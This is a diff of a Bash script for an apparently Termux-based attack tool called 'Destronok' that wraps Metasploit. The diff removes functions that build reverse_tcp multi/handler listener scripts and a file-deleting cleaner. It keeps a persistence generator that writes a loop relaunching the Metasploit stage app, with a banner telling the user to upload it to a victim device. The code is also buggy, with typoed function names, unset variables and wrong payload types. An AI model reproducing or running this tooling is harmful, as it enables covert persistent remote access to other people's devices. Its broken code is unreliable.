@@ -452,83 +452,16 @@ echo "ENTER TO CONTINUE"
 read ml
 returu
 }
- #==========================================================================================================================================
- function androidlisnr(){
-            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            read -p 'LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            read -p 'lHOST PORT: ' lport
-            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_droid.rc
-            echo "ENTER TO CONTINUE"
-            read anl
-            retru
-            }
-function linuxlisnr(){
-            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            read -p 'LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            read -p 'lHOST PORT: ' lhost
-            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc
-            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_linux.rc &
-            echo "ENTER TO CONTINUE"
-            read lnsr
-            retru
-            }
-     
-function windowslisnr(){
-            touch ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            read -p 'lHOST PORT: ' lhost
-            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            read -p 'Set LPORT: ' lhost
-            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            cat ~/data/data/com.termux/files/home/Destronok/meterpreter.rc
-            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter.rc &
-            echo "ENTER TO CONTINUE"
-            read wnl
-            retru
-            }
-            
-    function maclisnr(){
-            touch ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            echo use exploit/multi/handler > ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            read -p 'Set LHOST IP: ' lhost
-            echo set LHOST $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            read -p 'Set LPORT: ' lhost
-            echo set LPORT $uservar >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            echo set ExitOnSession false >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            echo exploit -j -z >> ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            cat ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            xterm -e msfconsole -r ~/data/data/com.termux/files/home/Destronok/meterpreter_mac.rc
-            echo "ENTER TO CONTINUE"
-            read mcl
-            retru
-            }
-
+ 
 #==========================================================================================================================================
 function andpr(){
-            touch ~/data/data/com.termux/files/home/Destronok/android.sh
-            echo \#\!/bin/bash >> ~/data/data/com.termux/files/home/Destronok/android.sh
-            echo while : >> ~/data/data/com.termux/files/home/Destronok/android.sh
-            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/data/data/com.termux/files/home/Destronok/android.sh
-            echo sleep 20 >> ~/data/data/com.termux/files/home/Destronok/android.sh
-            echo done >> ~/data/data/com.termux/files/home/Destronok/android.sh
-            cat ~/data/data/com.termux/files/home/Destronok/android.sh
+            touch ~/sdcard/destronok/android.sh
+            echo \#\!/bin/bash >> ~/sdcard/destronok/android.sh
+            echo while : >> ~/sdcard/destronok/android.sh
+            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/sdcard/destronok/android.sh
+            echo sleep 20 >> ~/sdcard/destronok/android.sh
+            echo done >> ~/sdcard/destronok/android.sh
+            cat ~/sdcard/destronok/android.sh
             echo -e "\E[1;33m==== \e[41m ANDROID.SH IS SAVE ON ~/data/data/com.termux/files/home/Destronok/android.sh UPLOAD IT VICTIM DEVICE \e[0m \e[1;33m====" 
             echo "========================================================================================================="
             echo ""
@@ -638,38 +571,7 @@ case $prpl in
 esac
 }
 
-#==========================================================================================================================================
-function listner(){
-clear
-     echo -e "\e[92m |=================================|"
-     echo -e "\e[92m |  \e[41m      LISNTER       \e[0m           \e[92m|"
-     echo -e "\e[92m |=================================|"
-     echo -e "\e[92m |  \e[93m[1] \e[92m ANDROID                   \e[92m|"
-     echo -e "\e[92m |  \e[93m[2] \e[93m LINUX                     \e[92m|"
-     echo -e "\e[92m |  \e[93m[3] \e[94m WINDOWS                   \e[92m|"
-     echo -e "\e[92m |  \e[93m[4] \e[95m MAC                       \e[92m|"
-     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
-     echo -e "\e[92m |=================================|"
-     echo -e "\e[93m BINRY:> "
-read lsnr
-case $lsnr in
-      1) androidlisnr
-      ;;
-      2) linuxlisnr
-      ;;
-      3) windowslisnr
-      ;;
-      4) maclisnr
-      ;;
-      0) main_menu
-      ;;
-       *) echo " [-] GIVE A VALID INPUT"
-         echo " [^] ENET TO TRY AGAIN"
-         read oo
-         menu
-      ;;
-esac
-}
+
 #==========================================================================================================================================      
 function returu(){
 clear
@@ -818,29 +720,7 @@ case $srptpl in
 esac
 }
 #==========================================================================================================================================
-function remove(){
 
-    echo -e $ye ""
-    echo " This Module will delete all the files present in "
-    echo -e $re " ghost${ye} directory of your sdcard "
-    echo " "
-    echo -e $cy " [=] Your Files "
-    ls /sdcard/ghost | cat -n 
-    echo -n -e $lg " Do you want to continue (y/n):"
-        read gok
-        if [ $gok == 'y' ]
-         then
-            cd /sdcard/ghost
-            rm *
-            cd $HOME
-         elif [ $gok == 'n' ]
-          then
-            main_menu
-         else
-            echo -e $ye"          Invalid Input "
-            remove
-        fi  
-}
 
 function main_menu(){
 
@@ -853,10 +733,8 @@ clear
      echo -e "\e[92m |  \e[91m[3] \e[33mSCRIPTING \e[32mPAYLOAD \e[0m              \e[92m|"
      echo -e "\e[92m |  \e[91m[4] \e[33mSHELL     \e[32mPAYLOAD     \e[0m          \e[92m|"
      echo -e "\e[92m |======================================|"
-     echo -e "\e[92m |  \e[91m[5] \e[33mSTART \e[96m LISTNER     \e[0m             \e[92m|"
-     echo -e "\e[92m |  \e[91m[6] \e[33mPAYLOAD \e[96m CLEANER   \e[0m             \e[92m|"
-     echo -e "\e[92m |  \e[91m[7] \e[33mSTART \e[96m METASPLOIT   \e[0m            \e[92m|"
-     echo -e "\e[92m |  \e[91m[8] \e[33mPERSISTANCE \e[96mSCRIPT  \e[0m            \e[92m|"
+     echo -e "\e[92m |  \e[91m[5] \e[33mSTART \e[96m METASPLOIT   \e[0m            \e[92m|"
+     echo -e "\e[92m |  \e[91m[6] \e[33mPERSISTANCE \e[96mSCRIPT  \e[0m            \e[92m|"
      echo -e "\e[92m |  \e[91m[0] \e[33mEXIT                    \e[0m        \e[92m|"
      echo -e "\e[92m |======================================|"
 echo -e "\e[93m DESTRN:> "
@@ -879,18 +757,10 @@ case $cho in
         returu
         ;;
      5) clear
-        listner 
-        returu
-        ;;
-     6) clear
-        remove
-        returu
-        ;;
-     7) clear
         metasploit
         returu
         ;;
-     8) clear
+     6) clear
         persistnc
         returu
         ;;
